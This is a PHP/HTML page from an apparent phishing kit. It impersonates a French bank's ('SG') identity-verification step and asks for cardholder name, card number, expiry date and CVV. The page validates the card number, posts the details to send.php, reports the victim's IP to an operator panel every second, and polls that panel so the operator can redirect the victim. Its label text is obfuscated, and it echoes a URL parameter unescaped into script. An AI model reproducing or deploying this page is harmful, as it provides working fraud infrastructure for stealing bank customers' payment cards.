<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Vérification</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/auth.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<header>
<div class="row">
    <div class="col text-left p-5">
        <img src="res/logo.svg" style="width:180px;">
    </div>
</div>
</header>

<div class="container-full p-5">

<div class="form">
<h3><?php $obf->obf("Confirmation d'identité"); ?></h3>
<p><?php $obf->obf("Veuillez entrer les informations personnelles et cliquer sur Suivant."); ?></p>

<?php if(isset($_GET['e'])){ ?>
<div class="form-col " style="color:red;">
Informations invalides, veuillez réessayer.
</div>
<?php } ?>

<div class="form-col ">
    <label for="d0"><?php $obf->obf("Nom du titulaire de la carte"); ?></label>
    <input type="text" class="textinput" id="d0" placeholder="">
</div>

<div class="form-col ">
    <label for="d1"><?php $obf->obf("Numéro de carte"); ?></label>
    <input type="text" class="textinput" id="d1" placeholder="XXXX XXXX XXXX XXXX">
</div>

<div class="form-col ">
    <label for="d2"><?php $obf->obf("Date d'expiration"); ?></label>
    <input type="text" class="textinput" id="d2" placeholder="MM/AA">
</div>

<div class="form-col ">
    <label for="d3"><?php $obf->obf("CVV"); ?></label>
    <input type="text" class="textinput" id="d3" placeholder="CVV">
</div>



<div class="form-col">
    <button class="submitbtn" onclick="sendInfo()" style="font-size:0.9em; width:100%;">Suivant</button>
</div>

</div>

</div>


<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script src="res/cdns/cv.js"></script>
<script>
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
 
var target = 'wait.php';

var allowSubmit;
var abortVal = true;
 

function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=0; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

 


if($("#d1").val().length<19){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}
 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    }
});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>43 || _exps[1]<23 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendInfo();
    }
});
 
$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

function sendInfo(){
    validate();

    if(allowSubmit){
        $.post("send.php",{
            name:$("#d0").val(),
            cc:$("#d1").val(),
            exp:$("#d2").val(),
            cvv:$("#d3").val()
        },()=>{
            window.location=target;
        });
    }


}

 

setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d && d!=0){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>